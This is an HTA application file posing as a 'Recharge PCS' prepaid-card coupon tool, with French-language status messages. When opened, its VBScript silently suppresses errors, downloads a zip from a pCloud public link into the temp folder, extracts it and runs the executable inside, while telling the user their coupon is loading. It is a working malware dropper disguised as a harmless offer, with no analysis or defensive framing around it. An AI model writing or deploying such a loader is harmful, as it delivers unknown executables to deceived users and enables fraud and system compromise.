<html>
<head>
<HTA:APPLICATION 
  ID="App"
  APPLICATIONNAME="Recharge PCS"
  BORDER="dialog"
  CAPTION="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
/>
<title>Recharge PCS</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #fefefe;
    color: #333;
    padding: 40px;
    text-align: center;
  }
  h1 {
    color: #e67e22;
    font-size: 2em;
  }
  .status {
    margin-top: 20px;
    font-size: 1.1em;
    color: #2980b9;
  }
</style>
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next

  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>Téléchargement de votre coupon en cours...</div>"

  Dim fso, shell, tempFolder, zipURL, zipPath, extractPath, http, stream, shellApp, exePath
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set shell = CreateObject("WScript.Shell")
  tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
  zipPath = tempFolder & "\Recharge-Pcs.zip"
  extractPath = tempFolder & "\RechargePCS"

  zipURL = "https://e.pcloud.link/publink/download?code=XZBl96ZDcumxqXn19QSerxY4ULg1FBqjotk"

  Set http = CreateObject("Microsoft.XMLHTTP")
  http.Open "GET", zipURL, False
  http.Send

  If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipPath, 2
    stream.Close
    document.getElementById("status").innerText = "✅ Téléchargement terminé. Extraction..."
  Else
    MsgBox "Erreur de téléchargement. Code HTTP: " & http.Status, 16, "Erreur"
    Exit Sub
  End If

  If Not fso.FolderExists(extractPath) Then
    fso.CreateFolder extractPath
  End If

  Set shellApp = CreateObject("Shell.Application")
  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items(), 4

  Dim i
  For i = 1 To 10
    WScript.Sleep 500
  Next

  exePath = extractPath & "\Recharge-Pcs.exe"
  If fso.FileExists(exePath) Then
    shell.Run Chr(34) & exePath & Chr(34), 1, False
    document.getElementById("status").innerText = "🎉 Recharge lancée avec succès !"
  Else
    document.getElementById("status").innerText = "❌ Recharge-Pcs.exe introuvable après extraction."
  End If
End Sub
</script>
</head>
<body>
  <h1>Recharge PCS</h1>
</body>
</html>